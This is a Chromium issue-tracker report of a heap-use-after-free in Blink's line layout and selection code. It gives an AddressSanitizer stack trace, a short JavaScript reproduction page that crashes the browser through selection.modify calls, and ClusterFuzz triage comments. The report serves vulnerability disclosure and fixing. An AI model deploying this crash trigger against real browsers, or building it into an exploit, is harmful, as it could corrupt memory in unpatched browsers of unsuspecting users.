# Security: heap-use-after-free in getLineLayoutItem

| Field | Value |
|-------|-------|
| **Issue ID** | [40084500](https://issues.chromium.org/issues/40084500) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Editing>Selection |
| **Reporter** | cl...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2016-06-08 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The testcase crashes the latest asan build of chromium as follows:

=================================================================  

==11460==ERROR: AddressSanitizer: heap-use-after-free on address 0x60e000035900 at pc 0x000008afb04d bp 0x7ffc14d8f5d0 sp 0x7ffc14d8f5c8  

READ of size 8 at 0x60e000035900 thread T0 (content\_shell)  

#0 0x8afb04c in getLineLayoutItem third\_party/WebKit/Source/core/layout/line/InlineBox.h:173:55  

#1 0x8afb04c in block third\_party/WebKit/Source/core/layout/line/RootInlineBox.cpp:405  

#2 0x8afb04c in blink::RootInlineBox::closestLeafChildForPoint(blink::LayoutPoint const&, bool) third\_party/WebKit/Source/core/layout/line/RootInlineBox.cpp:415  

#3 0x762188b in blink::previousLinePosition(blink::VisiblePositionTemplate<blink::EditingAlgorithm[blink::NodeTraversal](javascript:void(0);) > const&, blink::LayoutUnit, blink::EditableType) third\_party/WebKit/Source/core/editing/VisibleUnits.cpp:1329:47  

#4 0x75fa93c in blink::SelectionModifier::modifyMovingBackward(blink::TextGranularity) third\_party/WebKit/Source/core/editing/SelectionModifier.cpp:485:15  

#5 0x75fa201 in blink::SelectionModifier::modifyMovingLeft(blink::TextGranularity) third\_party/WebKit/Source/core/editing/SelectionModifier.cpp:459:15  

#6 0x75fb183 in blink::SelectionModifier::modify(blink::FrameSelection::EAlteration, blink::SelectionDirection, blink::TextGranularity) third\_party/WebKit/Source/core/editing/SelectionModifier.cpp:555:24  

#7 0x75b66bd in blink::FrameSelection::modify(blink::FrameSelection::EAlteration, blink::SelectionDirection, blink::TextGranularity, blink::EUserTriggered) third\_party/WebKit/Source/core/editing/FrameSelection.cpp:616:45  

#8 0x91e9078 in modifyMethod /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Selection.cpp:553:11  

#9 0x91e9078 in blink::DOMSelectionV8Internal::modifyMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Selection.cpp:559  

#10 0x3d859f1 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/api-arguments.cc:19:3  

#11 0x2a291c3 in v8::internal::(anonymous namespace)::HandleApiCallHelper(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)3>) v8/src/builtins.cc:4960:36  

#12 0x2ad08f5 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)3>, v8::internal::Isolate\*) v8/src/builtins.cc:4977:3  

#13 0x7f1753c063c6 (<unknown module>)  

#14 0x7f1753c6c8e4 (<unknown module>)  

#15 0x7f1753c6b2c9 (<unknown module>)  

#16 0x7f1753c42942 (<unknown module>)  

#17 0x7f1753c26e8e (<unknown module>)  

#18 0x30f04c0 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#19 0x30efe7f in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:154:10  

#20 0x2983244 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:4477:7  

#21 0x900b964 in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:506:28  

#22 0x8fe3079 in blink::V8LazyEventListener::callListenerFunction(blink::ScriptState\*, v8::Local[v8::Value](javascript:void(0);), blink::Event\*) third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:100:26  

#23 0x8fa6b8d in blink::V8AbstractEventListener::invokeEventHandler(blink::ScriptState\*, blink::Event\*, v8::Local[v8::Value](javascript:void(0);)) third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:130:23  

#24 0x8fa6641 in blink::V8AbstractEventListener::handleEvent(blink::ScriptState\*, blink::Event\*) third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:95:5  

#25 0x8fa6216 in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext\*, blink::Event\*) third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:84:5  

#26 0x671dff1 in blink::EventTarget::fireEventListeners(blink::Event\*, blink::EventTargetData\*, blink::HeapVector<blink::RegisteredEventListener, 1ul>&) third\_party/WebKit/Source/core/events/EventTarget.cpp:593:19  

#27 0x671bba0 in blink::EventTarget::fireEventListeners(blink::Event\*) third\_party/WebKit/Source/core/events/EventTarget.cpp:498:31  

#28 0x7965d2c in blink::LocalDOMWindow::dispatchEvent(blink::Event\*, blink::EventTarget\*) third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1433:12  

#29 0x7965192 in blink::LocalDOMWindow::dispatchLoadEvent() third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1406:9  

#30 0x796470e in blink::LocalDOMWindow::dispatchWindowLoadEvent() third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:414:5  

#31 0x7965749 in blink::LocalDOMWindow::documentWasClosed() third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:419:5  

#32 0x63b4218 in blink::Document::implicitClose() third\_party/WebKit/Source/core/dom/Document.cpp:2600:28  

#33 0x7d42b9f in blink::FrameLoader::checkCompleted() third\_party/WebKit/Source/core/loader/FrameLoader.cpp:618:30  

#34 0x7d425d4 in blink::FrameLoader::finishedParsing() third\_party/WebKit/Source/core/loader/FrameLoader.cpp:536:5  

#35 0x63ea37e in blink::Document::finishedParsing() third\_party/WebKit/Source/core/dom/Document.cpp:4763:25  

#36 0x6e09258 in end third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:797:20  

#37 0x6e09258 in attemptToRunDeferredScriptsAndEnd third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:810  

#38 0x6e09258 in blink::HTMLDocumentParser::prepareToStopParsing() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:220  

#39 0x6e1264a in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::OwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:445:17  

#40 0x6e0b30c in blink::HTMLDocumentParser::pumpPendingSpeculations() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:528:36  

#41 0x6e3bc9e in operator()<> third\_party/WebKit/Source/wtf/Functional.h:188:16  

#42 0x6e3bc9e in callInternal<0> third\_party/WebKit/Source/wtf/Functional.h:350  

#43 0x6e3bc9e in WTF::PartBoundFunctionImpl<(WTF::FunctionThreadAffinity)1, std::\_\_1::tuple<blink::CrossThreadWeakPersistentThisPointer[blink::HTMLParserScheduler](javascript:void(0);)&&>, WTF::FunctionWrapper<void (blink::HTMLParserScheduler::\*)()>>::operator()() third\_party/WebKit/Source/wtf/Functional.h:341  

#44 0x10214697 in Run<std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > base/bind\_internal.h:160:12  

#45 0x10214697 in MakeItSo<base::internal::RunnableAdapter<void (\*)(std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)> &, std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > base/bind\_internal.h:312  

#46 0x10214697 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >, false, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:364  

#47 0x8219d1 in Run base/callback.h:397:12  

#48 0x8219d1 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#49 0x1022fd3c in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::WorkQueue\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:289:19  

#50 0x1022ba4c in scheduler::TaskQueueManager::DoWork(base::TimeTicks, bool) components/scheduler/base/task\_queue\_manager.cc:201:13  

#51 0x10232267 in Run<scheduler::TaskQueueManager \*, const base::TimeTicks &, const bool &> base/bind\_internal.h:187:12  

#52 0x10232267 in MakeItSo<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)> &, base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), const base::TimeTicks &, const bool &> base/bind\_internal.h:325  

#53 0x10232267 in base::internal::Invoker<base::IndexSequence<0ul, 1ul, 2ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, void (scheduler::TaskQueueManager\*, base::TimeTicks, bool), base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), base::TimeTicks, bool>, true, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:364  

#54 0x8219d1 in Run base/callback.h:397:12  

#55 0x8219d1 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#56 0x6d6c95 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:475:19  

#57 0x6d7abf in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:484:5  

#58 0x6d8f1c in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:601:13  

#59 0x6e31cd in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:33:31  

#60 0x72c649 in base::RunLoop::Run() base/run\_loop.cc:35:10  

#61 0x6d4418 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:294:12  

#62 0xbae3391 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:199:37  

#63 0x63b427 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:345:14  

#64 0x63fc35 in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:787:12  

#65 0x63a1ad in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:20:28  

#66 0x502222 in main content/shell/app/shell\_main.cc:48:10  

#67 0x7f190648482f in \_\_libc\_start\_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291

0x60e000035900 is located 32 bytes inside of 160-byte region [0x60e0000358e0,0x60e000035980)  

freed by thread T0 (content\_shell) here:  

#0 0x4d671b in \_\_interceptor\_free (/home/nils/MonkeyChrome/OpRealEstate/asan-linux-release-398351/content\_shell+0x4d671b)  

#1 0x8665b91 in deleteLineRange third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:746:22  

#2 0x8665b91 in blink::LayoutBlockFlow::layoutRunsAndFloats(blink::LineLayoutState&) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:770  

#3 0x867dbaa in blink::LayoutBlockFlow::layoutInlineChildren(bool, blink::LayoutUnit&, blink::LayoutUnit&, blink::LayoutUnit) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:1612:9  

#4 0x86122c7 in blink::LayoutBlockFlow::layoutBlockFlow(bool, blink::LayoutUnit&, blink::SubtreeLayoutScope&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:479:9  

#5 0x8610b20 in blink::LayoutBlockFlow::layoutBlock(bool) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:386:16  

#6 0x85e2f22 in blink::LayoutBlock::layout() third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:359:5  

#7 0x8617082 in blink::LayoutBlockFlow::positionAndLayoutOnceIfNeeded(blink::LayoutBox&, blink::LayoutUnit, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:664:11  

#8 0x8617fa0 in blink::LayoutBlockFlow::layoutBlockChild(blink::LayoutBox&, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:714:30  

#9 0x862a356 in blink::LayoutBlockFlow::layoutBlockChildren(bool, blink::SubtreeLayoutScope&, blink::LayoutUnit, blink::LayoutUnit) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1199:9  

#10 0x86122f5 in blink::LayoutBlockFlow::layoutBlockFlow(bool, blink::LayoutUnit&, blink::SubtreeLayoutScope&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:481:9  

#11 0x8610b20 in blink::LayoutBlockFlow::layoutBlock(bool) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:386:16  

#12 0x85e2f22 in blink::LayoutBlock::layout() third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:359:5  

#13 0x8617082 in blink::LayoutBlockFlow::positionAndLayoutOnceIfNeeded(blink::LayoutBox&, blink::LayoutUnit, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:664:11  

#14 0x8617fa0 in blink::LayoutBlockFlow::layoutBlockChild(blink::LayoutBox&, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:714:30  

#15 0x862a356 in blink::LayoutBlockFlow::layoutBlockChildren(bool, blink::SubtreeLayoutScope&, blink::LayoutUnit, blink::LayoutUnit) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1199:9  

#16 0x86122f5 in blink::LayoutBlockFlow::layoutBlockFlow(bool, blink::LayoutUnit&, blink::SubtreeLayoutScope&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:481:9  

#17 0x8610b20 in blink::LayoutBlockFlow::layoutBlock(bool) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:386:16  

#18 0x85e2f22 in blink::LayoutBlock::layout() third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:359:5  

#19 0x89c4e16 in layoutContent third\_party/WebKit/Source/core/layout/LayoutView.cpp:184:22  

#20 0x89c4e16 in blink::LayoutView::layout() third\_party/WebKit/Source/core/layout/LayoutView.cpp:284  

#21 0x78fc680 in layoutFromRootObject third\_party/WebKit/Source/core/frame/FrameView.cpp:832:10  

#22 0x78fc680 in blink::FrameView::performLayout(bool) third\_party/WebKit/Source/core/frame/FrameView.cpp:901  

#23 0x78f4913 in blink::FrameView::layout() third\_party/WebKit/Source/core/frame/FrameView.cpp:1050:9  

#24 0x63a7cc2 in blink::Document::updateStyleAndLayout() third\_party/WebKit/Source/core/dom/Document.cpp:1879:20  

#25 0x63a791a in blink::Document::updateStyleAndLayoutIgnorePendingStylesheets(blink::Document::RunPostLayoutTasks) third\_party/WebKit/Source/core/dom/Document.cpp:1966:5  

#26 0x756df3b in blink::isEditablePosition(blink::PositionTemplate<blink::EditingAlgorithm[blink::NodeTraversal](javascript:void(0);) > const&, blink::EditableType, blink::EUpdateStyle) third\_party/WebKit/Source/core/editing/EditingUtilities.cpp:271:26  

#27 0x762187d in blink::previousLinePosition(blink::VisiblePositionTemplate<blink::EditingAlgorithm[blink::NodeTraversal](javascript:void(0);) > const&, blink::LayoutUnit, blink::EditableType) third\_party/WebKit/Source/core/editing/VisibleUnits.cpp:1329:85  

#28 0x75fa93c in blink::SelectionModifier::modifyMovingBackward(blink::TextGranularity) third\_party/WebKit/Source/core/editing/SelectionModifier.cpp:485:15  

#29 0x75fa201 in blink::SelectionModifier::modifyMovingLeft(blink::TextGranularity) third\_party/WebKit/Source/core/editing/SelectionModifier.cpp:459:15  

#30 0x75fb183 in blink::SelectionModifier::modify(blink::FrameSelection::EAlteration, blink::SelectionDirection, blink::TextGranularity) third\_party/WebKit/Source/core/editing/SelectionModifier.cpp:555:24  

#31 0x75b66bd in blink::FrameSelection::modify(blink::FrameSelection::EAlteration, blink::SelectionDirection, blink::TextGranularity, blink::EUserTriggered) third\_party/WebKit/Source/core/editing/FrameSelection.cpp:616:45  

#32 0x91e9078 in modifyMethod /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Selection.cpp:553:11  

#33 0x91e9078 in blink::DOMSelectionV8Internal::modifyMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Selection.cpp:559

previously allocated by thread T0 (content\_shell) here:  

#0 0x4d6a4d in \_\_interceptor\_malloc (/home/nils/MonkeyChrome/OpRealEstate/asan-linux-release-398351/content\_shell+0x4d6a4d)  

#1 0x8a8360a in partitionAlloc third\_party/WebKit/Source/wtf/allocator/PartitionAlloc.h:660:20  

#2 0x8a8360a in blink::InlineBox::operator new(unsigned long) third\_party/WebKit/Source/core/layout/line/InlineBox.cpp:81  

#3 0x864caed in blink::LayoutBlockFlow::createRootInlineBox() third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:3520:12  

#4 0x863a140 in blink::LayoutBlockFlow::createAndAppendRootInlineBox() third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1992:30  

#5 0x86570cb in createAndAppendRootInlineBox third\_party/WebKit/Source/core/layout/api/LineLayoutBlockFlow.h:208:31  

#6 0x86570cb in createInlineBoxForLayoutObject third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:120  

#7 0x86570cb in blink::LayoutBlockFlow::createLineBoxes(blink::LineLayoutItem, blink::LineInfo const&, blink::InlineBox\*) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:189  

#8 0x8658792 in blink::LayoutBlockFlow::constructLine(blink::BidiRunList[blink::BidiRun](javascript:void(0);)&, blink::LineInfo const&) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:288:25  

#9 0x8664e5c in blink::LayoutBlockFlow::createLineBoxesFromBidiRuns(unsigned int, blink::BidiRunList[blink::BidiRun](javascript:void(0);)&, blink::InlineIterator const&, blink::LineInfo&, blink::VerticalPositionCache&, blink::BidiRun\*, WTF::Vector<blink::WordMeasurement, 64ul, WTF::PartitionAllocator>&) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:704:30  

#10 0x866b815 in blink::LayoutBlockFlow::layoutRunsAndFloatsInRange(blink::LineLayoutState&, blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::InlineIterator const&, blink::BidiStatus const&) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:901:38  

#11 0x8665bc2 in blink::LayoutBlockFlow::layoutRunsAndFloats(blink::LineLayoutState&) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:773:5  

#12 0x867dbaa in blink::LayoutBlockFlow::layoutInlineChildren(bool, blink::LayoutUnit&, blink::LayoutUnit&, blink::LayoutUnit) third\_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:1612:9  

#13 0x86122c7 in blink::LayoutBlockFlow::layoutBlockFlow(bool, blink::LayoutUnit&, blink::SubtreeLayoutScope&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:479:9  

#14 0x8610b20 in blink::LayoutBlockFlow::layoutBlock(bool) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:386:16  

#15 0x85e2f22 in blink::LayoutBlock::layout() third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:359:5  

#16 0x8617082 in blink::LayoutBlockFlow::positionAndLayoutOnceIfNeeded(blink::LayoutBox&, blink::LayoutUnit, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:664:11  

#17 0x8617fa0 in blink::LayoutBlockFlow::layoutBlockChild(blink::LayoutBox&, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:714:30  

#18 0x862a356 in blink::LayoutBlockFlow::layoutBlockChildren(bool, blink::SubtreeLayoutScope&, blink::LayoutUnit, blink::LayoutUnit) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1199:9  

#19 0x86122f5 in blink::LayoutBlockFlow::layoutBlockFlow(bool, blink::LayoutUnit&, blink::SubtreeLayoutScope&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:481:9  

#20 0x8610b20 in blink::LayoutBlockFlow::layoutBlock(bool) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:386:16  

#21 0x85e2f22 in blink::LayoutBlock::layout() third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:359:5  

#22 0x8617082 in blink::LayoutBlockFlow::positionAndLayoutOnceIfNeeded(blink::LayoutBox&, blink::LayoutUnit, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:664:11  

#23 0x8617fa0 in blink::LayoutBlockFlow::layoutBlockChild(blink::LayoutBox&, blink::BlockChildrenLayoutInfo&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:714:30  

#24 0x862a356 in blink::LayoutBlockFlow::layoutBlockChildren(bool, blink::SubtreeLayoutScope&, blink::LayoutUnit, blink::LayoutUnit) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1199:9  

#25 0x86122f5 in blink::LayoutBlockFlow::layoutBlockFlow(bool, blink::LayoutUnit&, blink::SubtreeLayoutScope&) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:481:9  

#26 0x8610b20 in blink::LayoutBlockFlow::layoutBlock(bool) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:386:16  

#27 0x85e2f22 in blink::LayoutBlock::layout() third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:359:5  

#28 0x89c4e16 in layoutContent third\_party/WebKit/Source/core/layout/LayoutView.cpp:184:22  

#29 0x89c4e16 in blink::LayoutView::layout() third\_party/WebKit/Source/core/layout/LayoutView.cpp:284  

#30 0x78fc680 in layoutFromRootObject third\_party/WebKit/Source/core/frame/FrameView.cpp:832:10  

#31 0x78fc680 in blink::FrameView::performLayout(bool) third\_party/WebKit/Source/core/frame/FrameView.cpp:901  

#32 0x78f4913 in blink::FrameView::layout() third\_party/WebKit/Source/core/frame/FrameView.cpp:1050:9  

#33 0x63a7cc2 in blink::Document::updateStyleAndLayout() third\_party/WebKit/Source/core/dom/Document.cpp:1879:20  

#34 0x63a791a in blink::Document::updateStyleAndLayoutIgnorePendingStylesheets(blink::Document::RunPostLayoutTasks) third\_party/WebKit/Source/core/dom/Document.cpp:1966:5

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/WebKit/Source/core/layout/line/InlineBox.h:173:55 in getLineLayoutItem  

Shadow bytes around the buggy address:  

0x0c1c7fffead0: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa  

0x0c1c7fffeae0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1c7fffeaf0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa  

0x0c1c7fffeb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1c7fffeb10: 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd  

=>0x0c1c7fffeb20:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1c7fffeb30: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c1c7fffeb40: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa  

0x0c1c7fffeb50: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1c7fffeb60: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa  

0x0c1c7fffeb70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==11460==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-398351  

Operating System: Linux

**REPRODUCTION CASE**

<script>
function start() {
o31=window.getSelection();
o53=document.createRange();
o59=(new DOMParser()).parseFromString(unescape(''),'text/html');
o60=o59.all[0];
o61=o59.all[1];
o65=document.createElement('form');
o59.documentElement.appendChild(o65);
o68=document.createElement('table');
o60.appendChild(o68);
o86=document.createElement('style');
o87=document.createTextNode("@import url(}");
o86.appendChild(o87);
o31.addRange(o53);
o130=document.createElement('keygen');
o65.appendChild(o130);
o167=document.createElement('style');
o200=document.createElement('style');
o201=document.createTextNode(" key1{");
o200.appendChild(o201);
o65.appendChild(o200);
o61.appendChild(o167);
document.replaceChild(o59.documentElement,document.documentElement);
o324=document.createElement('style');
o167.appendChild(o324);
o31.modify('extend', 'right','line');
o31.modify('move', 'forward','lineboundary');
o398=document.createElement('link');
o398.setAttributeNS('','rel','import');
o31.modify('move', 'forward','character');
o200.appendChild(o86);
o324.appendChild(o398);
o31.modify('move', 'left','line');
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2016-06-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5033339291697152

### cl...@chromium.org (2016-06-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5033339291697152

Uploader: nparker@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x6110000933a0
Crash State:
  blink::RootInlineBox::closestLeafChildForPoint
  blink::previousLinePosition
  blink::SelectionModifier::modifyMovingBackward
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=325152:325175

Minimized Testcase (1.35 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97asDCUq2RimsxZVciA-qIJ-lWFZMqbqU3ZepFMHH3x8tRVEwDWS-kfinqw3LcuXDnFfBe8SuGbueNB5hk9jhwFha-b8hQ6K2QcWFkeq4laVW5RrfJZvKzHXKXBuBz7ToEHGE0AhYAj8rFd4VdGKo5ltrHgNQ

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.


### cl...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-06-10)

pdr: Would you mind taking a look at this? The only thing that looks potentially interesting to me in the regression range is https://codereview.chromium.org/947793002

### cl...@chromium.org (2016-06-11)

[Empty comment from Monorail migration]

### pd...@chromium.org (2016-06-11)

This is a use-after-free in editing but I don't see anything in the regression range that could be related. This does crash in debug builds which is useful.

It's clear from the use and freed stacks that we have a uaf, but this code doesn't look like it has changed recently. I've re-run the regressed task on clusterfuzz just in case.

@kojii, can you triage this to someone on the editing team?

[Monorail components: Blink>Editing]

### cl...@chromium.org (2016-06-11)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5033339291697152

Uploader: nparker@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x6110000933a0
Crash State:
  blink::RootInlineBox::closestLeafChildForPoint
  blink::previousLinePosition
  blink::SelectionModifier::modifyMovingBackward
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=325152:325175

